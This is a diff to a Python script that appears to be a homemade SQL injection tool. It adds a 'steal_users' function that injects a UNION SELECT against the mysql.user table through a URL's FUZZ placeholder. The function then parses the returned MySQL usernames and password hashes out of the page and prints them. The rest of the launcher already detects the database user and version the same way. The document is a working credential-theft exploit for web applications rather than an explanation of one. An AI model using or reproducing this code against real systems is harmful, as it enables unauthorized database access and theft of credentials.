@@ -70,6 +70,12 @@ def launcher(url, diction):
     username = detect_user(url)
     print('\nUsername is:\n' + username)
     print('\nVersion is:\n' + detect_version(url))
+    print('\n'+colored('Users of databases: ','blue'))
+    users = steal_users(url)
+    for user in users:
+        print(user, users[user])
+
+
 
 def detect_columns(url):
     new_url = url.replace('FUZZ', "' order by X-- -")
@@ -122,6 +128,17 @@ def detect_version(url):
     req = requests.get(new_url)
     version = search_pattern.search(req.text)
     return version[1] #эквивалентно version.group(1) одни скобки-одна группа. Групппой убираем TOK TOK
+
+def steal_users(url):
+    new_url = url.replace("FUZZ","-1'union select concat('TOK',user,'TOK'),concat('TIC',password,'TIC') from mysql.user-- -")
+    req = requests.get(new_url)
+    search_pattern = re.compile(r'Name: TOK([a-zA-Z].+?)TOK<br />role: TIC\*([A-Z0-9].+?)TIC')
+    result_of_parse = search_pattern.findall(req.text)
+    users_data = dict()
+    for result in result_of_parse:
+    #    print(result.group(1))
+        users_data[result[0]] = result[1]
+    return users_data
 
 if __name__ == "__main__":
     try:
